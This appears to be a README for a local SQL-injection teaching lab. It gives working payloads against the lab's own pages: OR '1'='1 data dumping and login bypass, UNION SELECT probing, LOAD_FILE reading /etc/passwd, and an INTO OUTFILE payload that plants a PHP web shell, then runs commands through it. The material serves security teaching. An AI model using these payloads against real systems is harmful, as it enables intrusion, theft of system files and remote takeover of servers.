# Start

Start the network with `./start_linux_network.sh`. You have to wait a bit until the databases are populated.

## Overview

To get an overview of the examples goto http://127.0.0.1:8781/

# Listing Example

## Standard query

http://127.0.0.1:8781/list_products/products_page.php?value=100

## Attack

### Verification

Error when calling this url:

http://127.0.0.1:8781/list_products/products_page.php?value=100%27

### List all products

http://127.0.0.1:8781/list_products/products_page.php?value=100' OR '1'='1

# Login Example

## Standard

http://127.0.0.1:8781/login/login.php

Enter 'admin', 'admin'

## Attack

### Verification

Error when calling this url:

http://127.0.0.1:8781/login/login.php?user=user'&password=pass'

### Circumvent Login

http://127.0.0.1:8781/login/login.php?user=admin&password=xyz' OR '1'='1

# File Attacks

## Verification

Check if you can do a [`UNION SELECT`](https://www.techonthenet.com/sql/union_all.php) (add numbers at the end of the line until the query works 1, then 1,2, then 1,2,3 and s forth...):

http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%201,2,3

## Read sensible files

If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON *.* TO 'user'@'%';` is set):

Use `LOAD_FILE`:

http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3

## Write code to server

Use `INTO OUTFILE`: 

http://127.0.0.1:8781/user_information.php?UserID=1%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27

`/var/www/html/cmd.php` should not exist before.

After that you can check remote code execution with:

http://127.0.0.1:8781/cmd.php?cmd=ls

